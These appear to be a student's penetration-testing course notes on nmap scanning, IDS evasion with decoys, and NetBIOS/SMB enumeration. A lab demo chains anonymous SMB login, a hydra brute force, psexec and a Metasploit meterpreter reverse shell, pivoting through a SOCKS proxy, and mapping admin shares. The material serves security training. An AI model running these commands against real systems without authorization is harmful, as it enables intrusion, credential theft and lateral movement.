# Networking

sA is the Ack Scan (Sends a Ack packet).

`nmap -sn [target IP]`

`nmap -Pn -sS -F [target IP]`

We can confirm if ports get filitered with:

`nmap -Pn -sA p-445,3389 [targetIP]`

Filtered/Closed: Firewall
unfilitered: No filtering, detection

IDS Evasion:

`nmap -Pn -sS -sV -F [targetIP]`

`sudo wireshark`

We get an issue, but thats ok. We run the scan and record the traffic. We don't run any IDS evasion here.

NMAP sends a SYN, we get back a SYY-ACK or RST, if we get a SYN-ACK we send back a RST

Decoy IP:

nmap -Pn -sS -sV -p445,3389 -f --data-length 200 -D 10.10.23.1,10.10.23.2 [targetIP]

# Network Enumeration

- After the host discovery and port scanning phase of a penetration test, the next logical phase is going to involve service enumeration.
- The goal of service enumeration is to gather additional, more specific/detailed information about the host/systems on a network and the service running on said host.
- This includes information like account names, shares, misconfigured services and so on.
- Like the scanning phase, enumeration involves active connection to the remote devices in the network.
- There are many protocols on neworked systems that an attacker can target if they have been misconfigured or have been left enabled.
- In this section of the course, we will be exploring the various tools and techniques that can be used to interact with these protocols, with the intent of eventually/potentially exploiting them in later phases.
![grafik](https://github.com/user-attachments/assets/7985c1c1-7b0b-4e4a-af5d-3d681c1fdd0a)

# SMB / NetBIOS Enumeration

- NetBIOS is an API and a set of network protocols for providing communication services over a local network.
- Functions: NetBIOS offers three primary services:
  - Name Service (NetBIOS-NS): Allows computers to register, unregister and resolve names in a local network.
  - Datagram Service (NetBIOS-DGM): Supports connectionsless communication and broadcasting.
  - Session Service (NetBIOS-SSN): Support connection-oriented communication for more reliable data transfers.
- Ports: NetBIOS typically uses ports 137 (Name Service). 138 (Datagram Service), and 139 (Session Service) over UDP and TCP

- SMB is a file sharing protocol
- Functions: SMB provides features for file and printer sharing, named pipes, and inter-process communication (IPC). It allows users to access files on remote computers as if they were local.
- Versions:
  - SMB 1.0: the original version which had security vulnerabilities. It was used with older operating systems like WinXP.
  - SMB 2.0/2.1: Introduced with Windows Vista/Windows Server 2008, offering improved performance and security.
  - SMB 3.0+: Introduced with Windows 8/Windows Server 2012, adding features like encryption, multichannel support, and improvements for virtualization.
- Ports: SMB generally uses port 445 for direct SMB traffic (bypassing NetBIOS) and port 139 when operating with NetBIOS.

## SMB & NetBIOS Enumeration

- While NetBIOS and SMB were once closely linked, modern networks rely primarly on SMB for file and printer sharing, often using DNS and other mechanisms for name resolution instead of NetBIOS.
- Modern implementations of Windows primarily use SMB and can work without NetBIOS, however, NetBIOS over TCP 139 is required for backward compatibility and are often enabled together


## Demo:

`cat /etc/hosts`

We can ping the first machine, but not the 2nd, because we need to pivot that machine.

`nmap demo.ine.local`

We can see the netbios port, so we do netbios enumeration

`nbtscan`

`whatis nbtscan`

`nbtscan 10.2.21.216/24`

We get the netBIOS names

`nmblookup -A `

`cat /etc/hosts/`

`nmblookup -A [demo.ine.local]`

`nmap -sU -p 137 [demo.ine.local]`

`nma -sU -sV -t4 --script nbstat.nse -p137 -Pn -n [demo.ine.local]`

We perform SMB enumeration:

`nmap -sV -p 139,445 demo.ine.local`

we utilize the nmap scripting engine to identify the smb protocol supported on this windows system. So we enumerate the versions of smb:

this are the options we have available:

`ls -al /usr/share/nmap/scripts/ | grep -e "smb-*"`

`nmap -p445 --script smb-protocols demo.ine.local`

We see that the smb port is open, but we have ntlm (smb v1) and other verisons. So we identified what versions of smb is supported. So we take advantage of SMB v1. but before we do that, we want to identify the security level of smb:

`nmap -p45 --script smb-security-mode demo.ine.local`

we test for specific vulnerability types for smbv1:

`smbclient -L demo.ine.local`

We hit enter because we try anonymous login. login successfully

We can perform username enumeration on the windows system because of the anonymous windows login:

`nmap -p445 --script smb-enum-users.nse [target IP]`

We get username, passworts etc.

Now, we can leverage this information for brute-forcing smb

`vim users.txt`

admin
administrator
root
quit

`hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb`

brute force is successful. 

`psexec.py administrator@demo.ine.local`

login

we get a session on the target

we also try to get a metasploit meterpreter session:

`msfconsole -q`

`search psexec`

`use [module]`

evtl. set payload

`set rhosts demo.ine.local`

`set SMBuser Administrator`

`set SMBPass password1`

`exploit`

we should a meterpreter session

`set payload windows/x64/meterpreter/reverse_tcp`

`sysinfo`

Now we want to gain access to the second system. We try to ping the demo2 from our current session on target1:

meterpreter:`shell`

metepreter:`ping [target2]`

metepreter:`run autoroute -s [demo.ine.local/20`

metepreter:`background`

We set up a proxy with metasploit proxy module:

`cat /etc/proxychains4.conf`

metasploit psexec: `search socks`

`use 0`

`show options`

`set version 4a`

`set SRVPORT 9050`: because thats configured

`exploit`

on target0, we check `netstat -antp`

`proxychains nmap demo1.ine.local -T -Pn -sV -p 445`

On the initial session, demo.ine.local, we check if we can interact with demo1.ine.local

`shell`

`net view [demo1]`

`background`

meterpeter: `migrate -N explorer.exe`

`shell`

`net view demo1`

`net use D: \\[Demo1]\Documents`

`net use K: \\[Demo1]\K$`

`dir`

`dir K:\`

We were mapping the share drive into our demo, that allows us the content of the shares














